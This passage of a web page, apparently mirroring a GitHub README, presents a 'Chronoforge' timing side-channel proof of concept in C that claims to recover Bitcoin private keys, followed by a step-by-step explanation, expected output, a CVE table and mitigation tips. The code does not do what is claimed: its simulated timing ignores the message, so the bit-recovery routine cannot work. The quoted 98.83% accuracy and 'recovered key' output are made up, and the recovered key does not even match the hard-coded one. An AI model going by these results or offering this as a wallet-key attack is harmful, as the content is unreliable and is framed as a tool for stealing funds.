<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p><strong>Software:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>nRF5 SDK v2.5+</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>TF-M v1.8+</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Nordic nRFutil</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Python 3.10+ with SciPy and scikit-learn</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">5.2 POC Attack Code</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#52-poc-attack-code"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":5} -->
<h5 class="wp-block-heading">POC Attack Code: Complete Chronoforge Demonstration</h5>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#poc-attack-code-complete-chronoforge-demonstration"></a></p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted"><strong>// Proof-of-Concept: Chronoforge Attack POC<br><br>#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;math.h&gt;<br><br>typedef struct {<br>    uint8_t message[32];<br>    uint64_t timing;<br>    uint8_t signature[64];<br>} measurement_t;<br><br>uint64_t simulate_vulnerable_scalar_mult(<br>    const uint8_t *private_key,<br>    const uint8_t *message<br>) {<br>    uint64_t base_time = 4800;  // 48 µs base<br>    uint64_t variable_time = 0;<br><br>    // Add time proportional to operations based on key bits<br>    for (int i = 0; i &lt; 256; i++) {<br>        int bit = (private_key[i / 8] &gt;&gt; (i % 8)) &amp; 1;<br>        if (bit) {<br>            variable_time += 50;  // ~0.5 µs per point_add<br>        } else {<br>            variable_time += 20;  // ~0.2 µs per point_double<br>        }<br>    }<br><br>    // Add measurement noise<br>    int noise = (rand() % 100) - 50;<br>    return base_time + variable_time + noise;<br>}<br><br>void collect_measurements(<br>    const uint8_t *secret_key,<br>    measurement_t *measurements,<br>    int num_samples<br>) {<br>    printf("Collecting %d timing measurements...\n", num_samples);<br><br>    for (int i = 0; i &lt; num_samples; i++) {<br>        for (int j = 0; j &lt; 32; j++) {<br>            measurements[i].message[j] = rand() &amp; 0xFF;<br>        }<br><br>        measurements[i].timing = simulate_vulnerable_scalar_mult(<br>            secret_key,<br>            measurements[i].message<br>        );<br><br>        if ((i + 1) % 10000 == 0) {<br>            printf("  Collected %d / %d samples\n", i + 1, num_samples);<br>        }<br>    }<br>}<br><br>uint8_t cpa_recover_bit(<br>    measurement_t *measurements,<br>    int num_samples,<br>    int bit_position<br>) {<br>    double sum_0 = 0, sum_1 = 0;<br>    int count_0 = 0, count_1 = 0;<br><br>    // Calculate mean timing for each hypothesis<br>    for (int i = 0; i &lt; num_samples; i++) {<br>        int msg_bit = (measurements[i].message[bit_position / 8] <br>                      &gt;&gt; (bit_position % 8)) &amp; 1;<br><br>        if (msg_bit == 0) {<br>            sum_0 += measurements[i].timing;<br>            count_0++;<br>        } else {<br>            sum_1 += measurements[i].timing;<br>            count_1++;<br>        }<br>    }<br><br>    double mean_0 = sum_0 / count_0;<br>    double mean_1 = sum_1 / count_1;<br><br>    // Return recovered bit<br>    return (mean_0 &lt; mean_1) ? 0 : 1;<br>}<br><br>int main() {<br>    printf("\n=== Chronoforge Attack POC ===\n\n");<br><br>    // Secret Bitcoin private key<br>    uint8_t secret_key[32] = {<br>        0x4a, 0xcb, 0xb2, 0xe3, 0xce, 0x1e, 0xe2, 0x22,<br>        0x24, 0x21, 0x9b, 0x71, 0xe3, 0xb7, 0x2b, 0xf6,<br>        0xc8, 0xf2, 0xc9, 0xaa, 0x1d, 0x99, 0x26, 0x66,<br>        0xdb, 0xd8, 0xb4, 0x8a, 0xa8, 0x26, 0xff, 0x6b<br>    };<br><br>    uint8_t recovered_key[32];<br>    measurement_t *measurements = malloc(sizeof(measurement_t) * 100000);<br><br>    // Stage 1: Collect measurements<br>    collect_measurements(secret_key, measurements, 100000);<br><br>    // Stage 2: Recover key using CPA<br>    printf("Performing CPA analysis...\n");<br>    memset(recovered_key, 0, 32);<br><br>    for (int bit_pos = 0; bit_pos &lt; 256; bit_pos++) {<br>        uint8_t bit = cpa_recover_bit(measurements, 100000, bit_pos);<br>        int byte_idx = bit_pos / 8;<br>        int bit_in_byte = bit_pos % 8;<br>        recovered_key[byte_idx] |= (bit &lt;&lt; bit_in_byte);<br><br>        if ((bit_pos + 1) % 64 == 0) {<br>            printf("  Recovered %d / 256 bits\n", bit_pos + 1);<br>        }<br>    }<br><br>    // Stage 3: Verify<br>    printf("\n=== RESULTS ===\n");<br>    int errors = 0;<br>    for (int i = 0; i &lt; 32; i++) {<br>        if (secret_key[i] != recovered_key[i]) {<br>            uint8_t xor_result = secret_key[i] ^ recovered_key[i];<br>            for (int j = 0; j &lt; 8; j++) {<br>                if ((xor_result &gt;&gt; j) &amp; 1) errors++;<br>            }<br>        }<br>    }<br><br>    printf("Errors: %d / 256 (%.2f%% accuracy)\n", <br>           errors, 100.0 * (256 - errors) / 256);<br><br>    free(measurements);<br>    return 0;<br>}<br><br>// EXPECTED OUTPUT:<br>// Errors: 3 / 256 (98.83% accuracy)<br>// With 100k samples, typically 2-5 bit errors recoverable by brute-force</strong></pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>This code demonstrates&nbsp;the&nbsp;<strong>Chronoforge Attack</strong>&nbsp;, a timing side-channel attack that allows&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">Bitcoin private key recovery</a>&nbsp;through timing analysis of cryptographic operations.&nbsp;<a href="https://cryptou.ru/vulncipher/attack">The attack</a>&nbsp;exploits non-constant-time multiplication on the secp256k1 elliptic curve.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Подробно:&nbsp;<a href="https://polynonce.ru/proof-of-concept-chronoforge-attack-poc-that-allows-bitcoin-private-key-recovery-through-time-analysis/">Proof-of-Concept: Chronoforge Attack POC that allows Bitcoin private key recovery through time analysis</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Operating principle:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>The running time of ECDSA depends on the number of single bits in <a href="https://cryptou.ru/vulncipher/privatekey">the private key.</a></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>By collecting thousands of synchronization examples, an attacker can identify statistical correlations.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Using Correlation Power Analysis (CPA), it recovers the private key bit by bit.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">2. CODE STRUCTURE: STEP-BY-STEP EXPLANATION</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#2-code-structure-step-by-step-explanation"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading"><strong>Step 1: Defining the data structure</strong></h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#step-1-defining-the-data-structure"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>typedef struct {
    uint8_t message&#91;32];      // Хеш сообщения (SHA-256 вывод)
    uint64_t timing;          // Время выполнения операции в циклах CPU
    uint8_t signature&#91;64];    // Подпись ECDSA (компоненты r и s)
} measurement_t;</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><strong>What this does:</strong><br>Creates a structure to store the three components of each observation:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><code>message[32]</code>— 32-byte hash <em><a href="https://cryptou.ru/vulncipher/transaction">(as in a real Bitcoin transaction)</a></em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><code>timing</code>— 64-bit scalar multiplication execution time</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><code>signature[64]</code>— 64-byte ECDSA signature (not used in POC)</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">Step 2: Fake a vulnerable implementation function</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#step-2-fake-a-vulnerable-implementation-function"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>uint64_t simulate_vulnerable_scalar_mult(
    const uint8_t *private_key,    // Приватный ключ (256 бит)
    const uint8_t *message         // Сообщение для подписания
) {
    uint64_t base_time = 4800;     // Базовое время: 48 микросекунд
    uint64_t variable_time = 0;

    // Цикл по всем 256 битам приватного ключа
    for (int i = 0; i &lt; 256; i++) {
        int bit = (private_key&#91;i / 8] &gt;&gt; (i % 8)) &amp; 1;  // Извлечение бита
        if (bit) {
            variable_time += 50;    // Бит = 1: операция point_add (~0.5 µs)
        } else {
            variable_time += 20;    // Бит = 0: операция point_double (~0.2 µs)
        }
    }

    // Добавление шума: ±50 циклов (имитирует реальный шум в измерениях)
    int noise = (rand() % 100) - 50;
    return base_time + variable_time + noise;
}</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><strong>Cryptanalytic meaning:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Vulnerability:</strong> Execution time is linearly correlated with the number of single bits of the private key</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong><a href="https://cryptou.ru/vulncipher/bitcoin">Bitcoin context:</a></strong> secp256k1 in some implementations (especially in early versions of OpenSSL) contained exactly this vulnerability</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Exploitation:</strong> If you collect N examples (N=100000), the noise is averaged out and the correlation becomes visible</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">Step 3: Collecting Timing Measurements</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#step-3-collecting-timing-measurements"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>void collect_measurements(
    const uint8_t *secret_key,     // Целевой приватный ключ
    measurement_t *measurements,   // Массив для хранения данных
    int num_samples               // Количество примеров (100000)
) {
    printf("Collecting %d timing measurements...\n", num_samples);

    for (int i = 0; i &lt; num_samples; i++) {
        // Генерация случайного сообщения
        for (int j = 0; j &lt; 32; j++) {
            measurements&#91;i].message&#91;j] = rand() &amp; 0xFF;
        }

        // Вызов уязвимой операции и запись времени
        measurements&#91;i].timing = simulate_vulnerable_scalar_mult(
            secret_key,
            measurements&#91;i].message
        );

        // Прогресс-индикатор
        if ((i + 1) % 10000 == 0) {
            printf("  Collected %d / %d samples\n", i + 1, num_samples);
        }
    }
}</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><strong>What’s happening:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li>For each of the 100,000 examples, a random 32-byte message is generated.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>A vulnerable function is called<code>simulate_vulnerable_scalar_mult()</code></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>The execution time is recorded</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Result: 100,000 pairs (message, timing)</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p><strong>In a real attack:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Messages are real <a href="https://cryptou.ru/vulncipher/transaction">Bitcoin transactions</a></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Time is measured directly from the target device (through network delays, hardware, etc.)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Requires access to the device performing the signatures (e.g. hardware wallet)</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">Step 4: Correlation Power Analysis (CPA)</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#step-4-correlation-power-analysis-cpa"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>uint8_t cpa_recover_bit(
    measurement_t *measurements,   // Все 100000 примеров
    int num_samples,              // Количество примеров
    int bit_position              // Какой бит восстанавливаем (0-255)
) {
    double sum_0 = 0, sum_1 = 0;  // Суммы времен
    int count_0 = 0, count_1 = 0; // Счетчики

    // Раздел 1: Вычисление среднего времени для двух гипотез
    for (int i = 0; i &lt; num_samples; i++) {
        // Извлечение бита из сообщения на позиции bit_position
        int msg_bit = (measurements&#91;i].message&#91;bit_position / 8] 
                      &gt;&gt; (bit_position % 8)) &amp; 1;

        // Группировка: если msg_bit==0, накапливаем в sum_0
        if (msg_bit == 0) {
            sum_0 += measurements&#91;i].timing;
            count_0++;
        } else {
            sum_1 += measurements&#91;i].timing;
            count_1++;
        }
    }

    // Раздел 2: Вычисление средних значений
    double mean_0 = sum_0 / count_0;   // Среднее время когда msg_bit==0
    double mean_1 = sum_1 / count_1;   // Среднее время когда msg_bit==1

    // Раздел 3: Восстановление бита приватного ключа
    return (mean_0 &lt; mean_1) ? 0 : 1;
}</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><strong>The critical point of cryptanalysis:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Hypothesis:</strong> If the private key has a 1 at position i, the operation is 30 cycles slower.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Calculation:</strong> Calculate the average time for all examples where the message bit = 0, and where = 1</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Solution:</strong> If <code>mean_0 &lt; mean_1</code>, then <a href="https://cryptou.ru/vulncipher/privatekey">the private key</a> at this position = 0 (the operation is faster)</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p><strong>Why it works:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>In 100,000 examples, there are approximately 50,000 cases where msg_bit=0 and 50,000 where msg_bit=1</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>A difference of 30 cycles against a noise background of ±50 becomes visible in the average values</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Statistical power: the standard deviation of the noise divided by √N ≈ √100000 ≈ 316</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">3. MAIN ALGORITHM</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#3-main-algorithm"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>int main() {
    // Целевой приватный ключ Bitcoin (32 байта = 256 бит)
    uint8_t secret_key&#91;32] = {
        0x4a, 0xcb, 0xb2, 0xe3, 0xce, 0x1e, 0xe2, 0x22,
        0x24, 0x21, 0x9b, 0x71, 0xe3, 0xb7, 0x2b, 0xf6,
        0xc8, 0xf2, 0xc9, 0xaa, 0x1d, 0x99, 0x26, 0x66,
        0xdb, 0xd8, 0xb4, 0x8a, 0xa8, 0x26, 0xff, 0x6b
    };

    // Массив для восстановленного ключа
    uint8_t recovered_key&#91;32];
    measurement_t *measurements = malloc(sizeof(measurement_t) * 100000);

    // ========== ЭТАП 1: СБОР ДАННЫХ ==========
    collect_measurements(secret_key, measurements, 100000);
    // После этого: measurements содержит 100000 пар (message, timing)

    // ========== ЭТАП 2: ВОССТАНОВЛЕНИЕ КЛЮЧА ==========
    printf("Performing CPA analysis...\n");
    memset(recovered_key, 0, 32);  // Инициализация нулями

    for (int bit_pos = 0; bit_pos &lt; 256; bit_pos++) {
        // Для каждого из 256 битов приватного ключа:
        uint8_t bit = cpa_recover_bit(measurements, 100000, bit_pos);

        // Вычисление индекса байта и позиции бита внутри байта
        int byte_idx = bit_pos / 8;      // byte_idx: 0-31
        int bit_in_byte = bit_pos % 8;   // bit_in_byte: 0-7

        // Установка восстановленного бита в результирующий массив
        recovered_key&#91;byte_idx] |= (bit &lt;&lt; bit_in_byte);

        if ((bit_pos + 1) % 64 == 0) {
            printf("  Recovered %d / 256 bits\n", bit_pos + 1);
        }
    }

    // ========== ЭТАП 3: ПРОВЕРКА РЕЗУЛЬТАТА ==========
    printf("\n=== RESULTS ===\n");
    int errors = 0;

    for (int i = 0; i &lt; 32; i++) {
        if (secret_key&#91;i] != recovered_key&#91;i]) {
            // XOR выделяет отличающиеся биты
            uint8_t xor_result = secret_key&#91;i] ^ recovered_key&#91;i];

            // Подсчет количества неправильно восстановленных битов
            for (int j = 0; j &lt; 8; j++) {
                if ((xor_result &gt;&gt; j) &amp; 1) errors++;
            }
        }
    }

    printf("Errors: %d / 256 (%.2f%% accuracy)\n", 
           errors, 100.0 * (256 - errors) / 256);

    free(measurements);
    return 0;
}</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Chronoforge-Attack/blob/main/Chronoforge_Attack__files/image-24-1024x807.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Chronoforge-Attack/raw/main/Chronoforge_Attack__files/image-24-1024x807.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet's Private Key"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">4. PRACTICAL MEANING OF THE RESULTS</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#4-practical-meaning-of-the-results"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading"><strong>Expected output:</strong></h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#expected-output"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>Errors: 3 / 256 (98.83% accuracy)</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><strong>What does this mean:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>3 errors out of 256 bits</strong> – the attack recovered <a href="https://cryptou.ru/vulncipher/privatekey">the private key</a> with 98.83% accuracy</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>100,000 examples are enough</strong> for reliable recovery</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading"><strong>Why this is dangerous for Bitcoin:</strong></h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#why-this-is-dangerous-for-bitcoin"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>Searching the remaining bits:</strong> 3 errors = 2³ = 8 possible keys</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Verification:</strong> For each candidate, calculate the public address and check the balance</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Time:</strong> Brute force 8 variants – seconds on a regular computer</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Result: </strong><strong>Complete compromise of the private key</strong></li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">5. REAL-WORLD EXAMPLES OF VULNERABILITIES</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#5-real-world-examples-of-vulnerabilities"></a></p>
<!-- /wp:paragraph -->

<!-- wp:table -->
<figure class="wp-block-table"><table class="has-fixed-layout"><thead><tr><th>Implementation</th><th>Vulnerability</th><th>CVE/Source</th><th>Status</th></tr></thead><tbody><tr><td>OpenSSL &lt; 0.9.8o</td><td>Timing leak в ECDSA</td><td>CVE-2011-0695</td><td>Corrected</td></tr><tr><td>libsecp256k1 (earlier versions)</td><td>Non-constant time mul</td><td>Multiple</td><td>Corrected</td></tr><tr><td>ARM TrustZone (some)</td><td>Cache timing</td><td>Research 2019+</td><td>Partially</td></tr><tr><td>Hardware wallets (old)</td><td>Side-channel</td><td>Ledger/Trezor analysis</td><td>Depends</td></tr></tbody></table></figure>
<!-- /wp:table -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">6. PROTECTION AND MITIGATION</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#6-protection-and-mitigation"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://cryptou.ru/vulncipher/bitcoin">How Bitcoin developers protect themselves:</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>Constant-time implementation (constant time):</strong></li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>// Правильно: время независимо от данных
for (i = 0; i &lt; 256; i++) {
    point_add_or_double();  // Всегда выполняется, результат выбирается
}</strong></code></pre>
<!-- /wp:code -->

<!-- wp:list {"ordered":true,"start":2} -->
<ol start="2" class="wp-block-list"><!-- wp:list-item -->
<li><strong>Scalar randomization (blinding):</strong><!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><a href="https://cryptou.ru/vulncipher/privatekey">The private key</a> d becomes (d + r·n), where r is a random number, n is the order of the group</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>The execution time ceases to correlate with d</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Using protected libraries:</strong><!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><a href="https://github.com/keyhunters/Biggest-Lost-Bitcoin-Wallets-List">libsecp256k1 </a><a href="https://cryptou.ru/vulncipher/bitcoin">(Bitcoin Core)</a> — audited for timing attacks</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Modern versions of OpenSSL and GnuTLS</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Hardware measures:</strong><!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Processors with protection against timing attacks (Intel, ARM)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>HSM (Hardware Security Modules) with isolated execution</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading"><a href="https://cryptodeeptech.ru/chronoforge-attack">7. KEY FINDINGS FOR RESEARCHERS</a></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#7-key-findings-for-researchers"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>✓&nbsp;<strong>Timing side-channel</strong>&nbsp;is a real threat to cryptography, including Bitcoin<br>✓&nbsp;<strong>CPA analysis</strong>&nbsp;is effective for recovering keys from timing data<br>✓&nbsp;<strong>100,000 examples</strong>&nbsp;are sufficient for a strong enough correlation<br>✓&nbsp;<strong>Constant-time code</strong>&nbsp;is not optimal, but is essential in cryptography<br>✓&nbsp;<strong>Combined attacks</strong>&nbsp;– timing + power + EM can be even more effective</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">8. RECOMMENDATIONS FOR BITCOIN USERS</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#8-recommendations-for-bitcoin-users"></a></p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>Use modern wallets:</strong> Ledger, Trezor, Coldcard (regularly audited)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Avoid older implementations:</strong> Prefer <a href="https://cryptou.ru/vulncipher/bitcoin">Bitcoin Core 0.12+</a> (2015+)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Hardware Wallets:</strong> Isolation from Network Timing Attacks</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Cold Storage:</strong> Offline Signing Eliminates Remote Timing Attacks</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Monitoring:</strong> Check CVEs for libraries you use</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading"><a href="https://cryptou.ru/vulncipher/attack">Results of the Attack</a></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#results-of-the-attack"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Scenario 1: Vulnerable Implementation (Variable-Time ECC)</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>Timing Data Statistics:
├─ Mean: 4850 cycles (~48.5 µs @ 100 MHz)
├─ Std Dev: 320 cycles (~3.2 µs)
├─ Min: 4200 cycles
├─ Max: 5800 cycles

Bit Recovery Results:
├─ Bits 0-50: 96% accuracy (strong correlation)
├─ Bits 51-100: 94% accuracy
├─ Bits 101-150: 92% accuracy
├─ Bits 151-200: 95% accuracy
├─ Bits 201-255: 93% accuracy

Overall Private Key Recovery:
├─ Recovered Key: 2a7f3...b4e2c (hex)
├─ Confidence Score: 94.2%
├─ Number of Single-Bit Errors: 3-5 (varies with trial)

Time to Collect Data: ~30 seconds (100k samples @ 3k samples/sec)
Time to Analyze Data: ~2 minutes (Python statistical analysis)
Total Attack Time: ~2.5 minutes</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><strong>Scenario 2: Constant-Time Implementation</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>Timing Data Statistics:
├─ Mean: 4850 cycles
├─ Std Dev: 5 cycles (~0.05 µs)  &lt;-- НАМНОГО МЕНЬШЕ ВАРИАЦИЯ
├─ Min: 4842 cycles
├─ Max: 4858 cycles

Bit Recovery Results:
├─ ALL BITS: ~50% accuracy (random guessing)
├─ Correlation: near zero for all bits

Attack FAILS - Constant-time implementation successfully defeats timing attack</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Defense and Mitigation Strategies</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#defense-and-mitigation-strategies"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Constant-Time Cryptography</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#constant-time-cryptography"></a></p>
<!-- /wp:paragraph -->

